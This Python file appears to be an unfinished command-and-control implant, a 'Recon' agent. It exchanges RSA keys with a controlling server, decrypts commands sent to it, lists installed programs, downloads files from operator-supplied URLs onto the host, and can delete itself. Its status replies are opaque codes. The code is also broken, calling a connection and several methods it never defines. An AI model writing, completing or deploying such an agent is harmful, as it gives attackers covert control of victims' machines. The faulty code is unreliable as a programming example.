import os
import json
from requests import get 
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
import base64
# import platform

# keygen
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)
public_key = private_key.public_key()
pem_public_key = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
).decode('utf-8')

class Recon:
    def __init__(self):
        self.agent_path = "C://Temp"
        
    def serialize_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.conn.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                continue

    # scan for program folders
    def scan(self):
        try:
            folders = os.listdir("C:/Program Files/")
            return folders
        except Exception as e:
            print("Error has occured")

    # retrieve file
    def receive_file(self, url, path):
        try: 
            data = get(url)
            with open (path, "wb") as file:
                file.write(data.content)
                return "A7xL9Q2rT4M1wK8"
        except FileNotFoundError:
            return f"J3rL8T2xP9M1yK4"
        except PermissionError:
            return f"K7T2xQ1L8P5yJ0F"
        except Exception as e:
            return f"An error occurred during file upload: \n{e}"
    
    # remove agent
    def destroy(self): 
        try:
            os.remove(self.agent_path)
            return "X7pL3mQ9rT2V5yJ8K1wF4N6xR0B"
        except Exception as e:
            return f"An error occurred: {e}"      
    
    # wait for server instr  
    def listen(self):
        while True:
            command = self.serialize_receive()
            if len(command) == 8:
                firstWord = command.split(" ",1)[0]
                if firstWord == "hostname":
                    output = self.exec(command)
                    self.hostname = output.strip().lower()
                    self.serialize_send(output)
            elif "BEGIN PUBLIC KEY" in command:
                pem_peer_key = command.encode('utf-8')
                peer_key = serialization.load_pem_public_key(pem_peer_key)
                self.serialize_send(pem_public_key)
            else:
                if isinstance(command, list):
                    decrypted_command = []
                    for command in command:
                        encrypted_chunk = base64.b64decode(command)
                        decrypted_chunk = private_key.decrypt(
                            encrypted_chunk,
                            padding.OAEP(
                                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                algorithm=hashes.SHA256(),
                                label=None
                            )
                        )
                        decrypted_command.append(decrypted_chunk)
                    decrypted_command = b''.join(decrypted_command)
                    command = decrypted_command
                else:
                    command = base64.b64decode(command)
                    command = private_key.decrypt(
                        command,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None
                        )
                    )
                command = command.decode('utf-8')
                firstWord = command.split(" ",1)[0]
                if firstWord == "getdirhash":
                    commandList = command.split(" ", 2)
                    output = self.receive_file(commandList[1], commandList[-1])

agent = Recon()
agent.listen()


# NOTE to self
# using the same hashes for receiving file



# Questions for later
# 1. the chunk encryption portion
# 2. how to determine hostname?